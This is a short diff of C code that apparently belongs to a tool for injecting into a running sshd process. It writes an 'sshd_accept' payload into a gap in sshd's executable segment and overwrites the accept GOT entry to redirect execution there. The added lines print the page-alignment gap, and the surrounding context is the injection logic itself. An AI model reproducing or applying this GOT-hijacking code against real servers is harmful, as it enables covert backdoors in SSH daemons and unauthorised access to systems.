@@ -60,6 +60,8 @@ main (int argc, char **argv)
   uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");
 
   uint64_t sshd_rx_start = sshd_base + get_seg_gap (SSHD_PATH, 5);
+  uint64_t sshd_rx_gap = sshd_rx_start % 0x1000;
+  printf ("sshd_rx_gap: %lx", (0x1000 - sshd_rx_gap));
 
   copy_to_tracee (pid, sshd_rx_start, sshd_accept, sizeof (sshd_accept));
   copy_to_tracee (pid, accept_got, (uint8_t *)&sshd_rx_start, 0x8);
